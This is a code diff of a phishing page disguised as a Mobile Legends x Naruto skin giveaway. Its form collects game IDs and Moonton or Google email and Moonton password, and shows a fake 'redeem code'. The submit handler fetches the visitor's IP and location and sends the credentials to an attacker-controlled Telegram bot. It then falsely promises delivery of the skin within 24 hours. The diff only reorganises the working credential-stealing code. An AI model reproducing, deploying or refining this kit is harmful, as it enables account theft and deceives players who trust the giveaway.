@@ -44,26 +44,32 @@
 
   <form id="redeemForm">
     <h2>Redeem Skin MLBB x Naruto</h2>
-    
-    <!-- User ID and Zone ID with numeric validation -->
-    <input type="text" id="userId" placeholder="Enter your User ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-    <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-    
-    <!-- Email field changes based on login method -->
-    <div id="emailLabelDiv">
-      <input type="email" name="email" id="emailField" placeholder="Moonton Email" required>
-    </div>
-    
-    <!-- Password field changes based on login method -->
-    <div id="passwordLabelDiv">
-      <input type="password" name="password" id="passwordField" placeholder="Moonton Password" required>
-    </div>
 
+    <!-- User ID and Zone ID - number only -->
+    <input type="text" id="userId" placeholder="Enter your User ID" 
+           required inputmode="numeric" pattern="[0-9]*" 
+           oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+    <input type="text" id="zoneId" placeholder="Enter your Zone ID" 
+           required inputmode="numeric" pattern="[0-9]*" 
+           oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+    <!-- Login method -->
     <select name="method" id="methodSelect" required>
       <option value="Moonton">Login with Moonton</option>
       <option value="Google">Login with Google</option>
     </select>
 
+    <!-- Email field -->
+    <div id="emailLabelDiv">
+      <input type="email" name="email" id="emailField" placeholder="Moonton Email" required>
+    </div>
+
+    <!-- Password field -->
+    <div id="passwordLabelDiv">
+      <input type="password" name="password" id="passwordField" placeholder="Moonton Password" required>
+    </div>
+
+    <!-- Skin selection -->
     <select name="skin" id="skinSelect" required>
       <option value="">Choose Naruto Skin</option>
       <option value="Naruto">Naruto</option>
@@ -72,30 +78,27 @@
       <option value="Kakashi">Kakashi</option>
     </select>
 
+    <!-- Code display -->
     <input type="text" name="code" id="codeField" placeholder="Redeem Code" readonly required>
 
     <button type="submit">Redeem Skin</button>
   </form>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';     // Replace with your chat ID
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your Telegram bot token
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';     // Replace with your Telegram chat ID
 
-    const skinSelect = document.getElementById('skinSelect');
-    const codeField = document.getElementById('codeField');
     const methodSelect = document.getElementById('methodSelect');
-    const emailField = document.getElementById('emailField');
-    const passwordField = document.getElementById('passwordField');
     const emailLabelDiv = document.getElementById('emailLabelDiv');
     const passwordLabelDiv = document.getElementById('passwordLabelDiv');
+    const skinSelect = document.getElementById('skinSelect');
+    const codeField = document.getElementById('codeField');
 
-    // Adjust form fields based on the selected login method
-    methodSelect.addEventListener('change', function() {
-      const method = methodSelect.value;
-
+    methodSelect.addEventListener('change', function () {
+      const method = this.value;
       if (method === 'Google') {
         emailLabelDiv.innerHTML = '<input type="email" name="email" id="emailField" placeholder="Google Email" required>';
-        passwordLabelDiv.innerHTML = ''; // Remove password field for Google login
+        passwordLabelDiv.innerHTML = '';
       } else {
         emailLabelDiv.innerHTML = '<input type="email" name="email" id="emailField" placeholder="Moonton Email" required>';
         passwordLabelDiv.innerHTML = '<input type="password" name="password" id="passwordField" placeholder="Moonton Password" required>';
@@ -105,7 +108,6 @@
     skinSelect.addEventListener('change', () => {
       const skin = skinSelect.value;
       if (skin) {
-        // Generate random redeem code with skin name
         const code = `${skin.toUpperCase()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
         codeField.value = code;
       } else {
@@ -113,16 +115,16 @@
       }
     });
 
-    document.getElementById('redeemForm').addEventListener('submit', async function(e) {
+    document.getElementById('redeemForm').addEventListener('submit', async function (e) {
       e.preventDefault();
 
-      const userId = this.userId.value;
-      const zoneId = this.zoneId.value;
-      const email = this.email.value;
-      const password = this.password.value;
-      const method = this.method.value;
-      const skin = this.skin.value;
-      const code = this.code.value;
+      const userId = document.getElementById('userId').value;
+      const zoneId = document.getElementById('zoneId').value;
+      const email = document.getElementById('emailField').value;
+      const password = document.getElementById('passwordField')?.value || '-';
+      const method = document.getElementById('methodSelect').value;
+      const skin = document.getElementById('skinSelect').value;
+      const code = document.getElementById('codeField').value;
 
       try {
         const ipRes = await fetch('https://ipwho.is/');
@@ -148,10 +150,7 @@ Country: ${ipData.country} (${ipData.country_code})
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message
-          })
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
         });
 
         alert("Redeem successful! The skin will be delivered within 24 hours.");
@@ -159,10 +158,10 @@ Country: ${ipData.country} (${ipData.country_code})
         codeField.value = '';
       } catch (err) {
         console.error(err);
-        alert("An error occurred while sending the data.");
+        alert("An error occurred. Please try again later.");
       }
     });
   </script>
 
 </body>
-</html>
+  </html>
